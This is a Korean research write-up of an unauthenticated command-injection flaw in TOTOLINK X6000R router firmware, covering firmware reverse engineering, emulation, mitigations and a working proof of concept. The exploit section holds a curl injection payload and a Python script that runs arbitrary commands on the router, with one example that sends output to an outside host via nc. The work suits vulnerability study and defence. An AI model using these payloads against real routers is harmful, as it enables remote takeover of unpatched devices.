# CVE-2025-11005 분석 보고서

> **요약**: TOTOLINK X6000R 라우터의 웹 서버 바이너리(`/usr/sbin/shttpd`)에서 **OS 명령어 주입** 취약점이 발견됨. `setWiFiAclRules` API의 `desc` 파라미터에 대한 입력값 검증 부재로 **인증 없이** 원격 코드 실행 가능. 본 문서는 펌웨어 역공학을 통한 취약 바이너리 추적, IDA Pro 정적 분석, QEMU 에뮬레이션, PoC 재현을 체계적으로 정리한다.

---

## 1. 취약점 소개

### 1.1 개요

| 항목 | 내용 |
|---|---|
| 취약점 명칭 | CVE-2025-11005 |
| 취약 유형 | OS 명령어 주입 *(CWE-78)* |
| 심각도 (CVSS) | 9.3 / CRITICAL |
| 공격 조건 | 네트워크 원격 공격 / **인증 불필요 (Unauthenticated)** |
| 발생 위치 | `/usr/sbin/shttpd` 바이너리 (setWiFiAclRules 함수) |
| PoC 공개 여부 | 없음 *(본 문서의 PoC는 연구 재현용)* |

### 1.2 영향 범위

| 제품 | 영향 받는 펌웨어 버전 |
|---|---|
| **TOTOLINK X6000R** | **V9.4.0cu.1458_B20250708 이하** |

### 1.3 테스트 이미지

- **취약 버전**: V9.4.0cu.1458_B20250708  
  링크: <https://www.totolink.net/data/upload/20250716/e934290a3c76ec28a590e0be19ef3954.zip>

- **패치 버전**: V9.4.0cu.1498_B20250826  
  링크: <https://www.totolink.net/data/upload/20250826/33346ed062283d5e887b217a9d5202ef.zip>

---

## 2. 정적 분석

### 2.1 펌웨어 구조 (SquashFS 루트)

```bash
squashfs-root/
├── bin/
│   └── busybox            # shell
├── etc/
│   └── init.d/
│       └── shttpd         # 웹 서버 실행 스크립트
├── sbin/
│   └── crpc              # 초기 분석 시 의심했던 RPC 바이너리
├── usr/
│   └── sbin/
│       └── shttpd        # 취약점이 존재하는 웹 서버 바이너리
├── web/                  # 웹 서버 루트 디렉터리
│   ├── advance/
│   │   └── acl.html
│   └── static/
│       └── js/
│           ├── config.js
│           └── topicurl.js
└── www/
```

### 2.2 펌웨어 추출

다운로드 받은 zip 파일을 풀어 `.web` 파일을 `binwalk`로 추출한다.

```bash
binwalk -Me TOTOLINK_C8380R_X6000R_IP04499_MT7981_SPI_16M256M_V9.4.0cu.1360_B20241207_ALL.web
```

### 2.3 Diffing

영향 받는 버전과 패치 버전을 비교했으나, **거의 모든 파일이 변경**되어 의미 있는 diff 결과를 얻을 수 없었다.

```bash
diff -qr /path/to/V9.4.0cu.1458_B20250708/squashfs-root/ \
         /path/to/V9.4.0cu.1498_B20250826/squashfs-root/
```

주요 변경 파일:
- `usr/sbin/shttpd` (취약 바이너리 패치)
- busybox, 각종 시스템 바이너리
- opkg 메타데이터

따라서 **CVE 공개 정보를 바탕으로 역추적** 방식으로 취약 바이너리를 특정했다.

### 2.4 Root Cause 발견 과정

#### 2.4.1 공개된 정보

| 항목 | 내용 |
|---|---|
| 취약 함수 | `setWiFiAclRules` |
| 취약 파라미터 | `desc` |
| 인증 여부 | 미인증 (Unauthenticated) |
| 원인 | `desc` 파라미터의 입력값을 검증하지 않고 시스템 명령어에 사용 |

#### 2.4.2 1단계: 초기 분석 및 잘못된 가설 (LuCI 시스템 분석)

**가설**: 대부분의 공유기는 OpenWrt의 LuCI 프레임워크를 사용하므로, 취약점도 LuCI Lua 스크립트 내에 존재할 것

**탐색**:
```bash
grep -r "setWiFiAclRules" /usr/lib/lua/luci/
```

**결과**: 해당 함수를 사용하는 소스 코드 없음 → **가설 폐기**

#### 2.4.3 2단계: 아키텍처 전환 (프론트엔드 분석)

**가설 수정**: LuCI가 아니라면 프론트엔드(JavaScript) 코드에 백엔드 통신 단서가 있을 것

**탐색**:
```bash
grep -r "setWiFiAclRules" /web/static/js/
```

**발견**: `web/static/js/topicurl.js`에서 `setWiFiAclRules` API 함수 정의 발견
```javascript
o.prototype.setWiFiAclRules = function(t, o) { 
    return this.topicurl = "setWiFiAclRules"...
}
```

→ 이 시스템이 LuCI가 아닌 **독자적인 JavaScript API 프레임워크** 사용을 확인

#### 2.4.4 3단계: 실제 엔드포인트 식별

**가설**: JavaScript 코드는 특정 백엔드 URL로 API 요청을 보낼 것

**탐색**: `web/static/js/config.js` 분석

**발견**: 
```javascript
globalConfig.cgiUrl: "/cgi-bin/cstecgi.cgi"
```
→ 모든 API 요청이 단일 엔드포인트 `/cgi-bin/cstecgi.cgi`로 전송됨을 확인

#### 2.4.5 4단계: 취약 바이너리 역추적 및 확정

**1) 가설**: `/cgi-bin/cstecgi.cgi` 파일이 파일 시스템에 존재

**탐색**:
```bash
find . -name "*cstecgi.cgi*"
```

**결과**: 파일 없음 → 가상 주소이며 웹 서버에서 특별 처리

**2) 가설 수정**: 웹 서버가 요청을 다른 실행 파일로 넘길 것. `/sbin/crpc` 의심

**탐색**:
```bash
strings ./sbin/crpc | grep setWiFiAclRules
```

**결과**: 관련 문자열 없음 → `crpc`는 범인 아님

**3) 최종 가설**: 남은 후보는 웹 서버 자신(`/usr/sbin/shttpd`) 뿐

**최종 검증**:
```bash
strings ./usr/sbin/shttpd | grep setWiFiAclRules
# → setWiFiAclRules 발견!
```

**결론**: `/usr/sbin/shttpd`가 취약한 바이너리임을 확정

---

### 2.5 소스 코드 분석 (shttpd - IDA Pro)

#### 2.5.1 setWiFiAclRules 문자열 탐색

IDA Pro의 strings 목록에서 `setWiFiAclRules` 검색 → 데이터 섹션에서 발견

해당 문자열을 포함하는 구조체:
```
LOAD:000000000044AD88  DCB "getWiFiEasyCfg",0
```

이 구조체를 참조하는 함수 추적 → `sub_40BC7C`

#### 2.5.2 sub_40BC7C 함수

초기화 함수로, `setWiFiAclRules` 문자열을 포함한 전역 변수 테이블(`unk_450768`)을 설정

핵심 코드:
```c
else if ( !strncmp(s1, "set", 3uLL) && *a3 <= 59 )
{
    memcpy((char *)&unk_450768 + 80 * *a3, s1, 0x50uLL);
    ++*a3;
}
```

#### 2.5.3 sub_40BF40 함수

**역할**: 핸들러를 '찾는' 함수

**동작 흐름**:
1. `json_tokener_parse(a1)`: JSON 요청 파싱
2. `json_object_get_string(v29)`: `topicurl` 값 추출
3. 테이블 순회하며 일치하는 핸들러 검색:
   ```c
   if ( strstr(string, "set") )
   {
       v26 = (const char *)&unk_450768;  // "set" 함수 목록
       while ( 1 )
       {
           v27 = v26;
           if ( !*((_QWORD *)v26 + 8) )
               break;
           v28 = v26;
           v26 += 80;
           if ( !strncmp(string, v28, 0x40uLL) )
           {
               v22 = 2;
               *v3 = string;
               v3[2] = v27;  // 핸들러 정보 저장
               goto LABEL_29;
           }
       }
   }
   ```
4. 일치하는 핸들러 정보 반환

#### 2.5.4 sub_40A290 함수

**역할**: HTTP 요청을 받아 API를 실행하는 최상위 핸들러

**취약 함수 호출 지점**:
```c
v12 = sub_40BF40(a1[1]);  // 핸들러 찾기
if ( v12 )
{
    // ... (중략) ...
    
    // 핸들러의 함수 포인터 실행
    (*((void (__fastcall **)(const char *, __int64))v12[2] + 8))(v12[1], a2);
    
    // ... (중략) ...
}
```

**실행 흐름**:
1. `sub_40BF40`로 `setWiFiAclRules` 핸들러 정보(`v12`) 획득
2. `v12[2] + 8` 위치의 함수 포인터 추출
3. JSON 객체(`v12[1]`)를 파라미터로 함수 실행
4. **이 지점에서 `desc` 파라미터 검증 없이 시스템 명령어로 전달 → RCE 발생**

---

## 3. 에뮬레이션 (QEMU User-mode)

### 3.1 QEMU 바이너리 주입

```bash
sudo cp /usr/bin/qemu-aarch64 ./usr/bin
```

### 3.2 마운트 & chroot

```bash
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
sudo mount --bind /sys ./sys

sudo rm ./var
sudo mkdir -p ./var/run

sudo chroot . ./usr/bin/qemu-aarch64 /bin/sh
```

### 3.3 웹 서버 실행

```bash
# chroot 내부에서
ubusd &
/usr/sbin/shttpd -root /web
```

> **참고**: 실제 라우터 환경과 유사하게 구성하려면 추가 설정 필요 (uci, network 등)

---

## 4. Exploit (연구 재현용)

### 4.1 PoC

#### 4.1.1 curl을 이용한 공격

```bash
curl 'http://<ROUTER_IP>/cgi-bin/cstecgi.cgi' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -X POST \
  --data-raw '{"topicurl":"setWiFiAclRules","mac":"AA:BB:CC:DD:EE:FF","desc":"$(id|tee /tmp/pwned.txt)","addEffect":"1","wifiIdx":"0"}'
```

#### 4.1.2 Python PoC (exploit.py)

```python
#!/usr/bin/env python3
import requests
import argparse
import json

def exploit(target_ip, command):
    target_url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"
    
    headers = {"Content-Type": "application/json;charset=UTF-8"}
    payload = f"$({command})"
    
    data = {
        "topicurl": "setWiFiAclRules",
        "mac": "AA:BB:CC:DD:EE:FF",
        "desc": payload,
        "addEffect": "1",
        "wifiIdx": "0"
    }
    
    response = requests.post(target_url, headers=headers, 
                           data=json.dumps(data), timeout=10)
    
    if response.status_code == 200:
        print("[+] 공격 성공!")
        print(f"[*] '{command}' 실행 결과를 라우터에서 확인하세요.")
    else:
        print(f"[-] 공격 실패: {response.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-11005 PoC")
    parser.add_argument("target_ip", help="타겟 라우터 IP")
    parser.add_argument("command", help="실행할 명령어")
    args = parser.parse_args()
    
    exploit(args.target_ip, args.command)
```

**사용법**:
```bash
chmod +x exploit.py
./exploit.py 192.168.1.1 'id | nc 192.168.0.26 4444'
```

### 4.2 공격 흐름 요약

#### 4.2.1 [클라이언트] 페이로드 생성 및 전송

1. **페이로드 생성**: 
   - `topicurl`: `"setWiFiAclRules"` 지정
   - `desc`: `"$(id | tee /tmp/pwned.txt)"` - 쉘 명령어 치환 문법 사용
   - 기타 필수 파라미터: `mac`, `addEffect`, `wifiIdx`

2. **요청 전송**:
   ```
   POST /cgi-bin/cstecgi.cgi
   Content-Type: application/json
   ```

#### 4.2.2 [서버] 요청 수신 및 컨트롤러 진입

1. `/usr/sbin/shttpd`가 가상 주소 `/cgi-bin/cstecgi.cgi`로의 POST 요청 수신
2. 내부 API 처리 로직 실행 시작

#### 4.2.3 [서버] 요청 분배 (Dispatching)

1. `sub_40A290` 함수 진입
2. `sub_40BF40` 호출하여 `topicurl("setWiFiAclRules")` 핸들러 검색
3. `unk_450768` 테이블에서 매칭되는 핸들러 정보 반환

#### 4.2.4 [서버] 취약 함수 실행 및 RCE 발생

1. 핸들러 구조체에서 함수 포인터 추출
2. `setWiFiAclRules` 실제 로직 함수 호출
3. **`desc` 파라미터 검증 없이 시스템 명령어로 사용**
4. `$(id | nc <attacker_ip> 4444)` 쉘 실행 → **RCE 성공**

---

## 5. 재현 체크리스트

- [ ] 펌웨어 추출 및 SquashFS 루트 준비
- [ ] `qemu-aarch64` 주입 완료
- [ ] `/dev`, `/proc`, `/sys` 마운트 완료
- [ ] chroot 진입 및 `ubusd`, `shttpd` 실행
- [ ] 대상 펌웨어가 **패치 이전**(V9.4.0cu.1458_B20250708 이하)임 확인
- [ ] 네트워크 격리 환경(로컬 랩) 구성
- [ ] PoC 테스트 수행 및 `/tmp/pwned.txt` 확인

---

## 6. 완화 및 패치 요약

- **입력 검증**: `desc` 파라미터에 대한 화이트리스트 검증 추가
- **안전한 명령 실행**: 문자열 결합 대신 파라미터 배열 방식 사용
- **인증 강화**: 중요 API에 대한 인증 요구
- **운영 측면**: 
  - 최신 펌웨어 적용 (V9.4.0cu.1498_B20250826 이상)
  - 관리자 인터페이스 접근 제한
  - 불필요한 서비스 비활성화

---

## 7. 참고 자료

- CVE Details: CVE-2025-11005 (공개 예정)
- TOTOLINK 공식 펌웨어: <https://www.totolink.net>

---

> **주의**: 본 문서는 교육·연구 재현 목적이며, 패치 이전 기기에 대한 무단 테스트를 금한다. 모든 PoC는 **격리된 로컬 환경**에서만 사용한다.
